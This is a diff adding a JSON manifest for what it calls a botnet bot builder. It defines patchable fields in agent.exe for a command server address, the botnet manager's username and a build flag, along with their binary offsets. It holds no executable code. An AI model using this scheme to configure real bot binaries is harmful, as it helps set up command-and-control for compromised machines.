@@ -1,0 +1,64 @@
+{
+    "info": {
+        "type": "manifest",
+        "version": "1.0"
+    },
+    "binaries": [
+        {
+            "id": "agent",
+            "bin": "agent.exe",
+            "map": "agent.map",
+            "variables": [
+                {
+                    "name": "srvrIP",
+                    "obfuscation": "none"
+                },
+                {
+                    "name": "ownerID",
+                    "obfuscation": "none"
+                },
+                {
+                    "name": "built",
+                    "obfuscation": "none"
+                }
+            ]
+        }
+    ],
+    "configurables": [
+        {
+            "name": "srvrIP",
+            "description": "Host to connect to in order to recieve commands",
+            "type": "string",
+            "length": "256"
+        },
+        {
+            "name": "ownerID",
+            "description": "Username of individual who manages botnet",
+            "type": "string",
+            "size": "256"
+        },
+        {
+            "name": "built",
+            "description": "Enter YES to build bot",
+            "type": "string",
+            "size": "4"
+        }
+    ],
+    "relocations": [
+        {
+            "id": "agent",
+            "varid": "srvrIP",
+            "offset": "0x36000"
+        },
+        {
+            "id": "agent",
+            "varid": "ownerID",
+            "offset": "0x36100"
+        },
+        {
+            "id": "agent",
+            "varid": "built",
+            "offset": "0x36200"
+        }
+    ]
+}
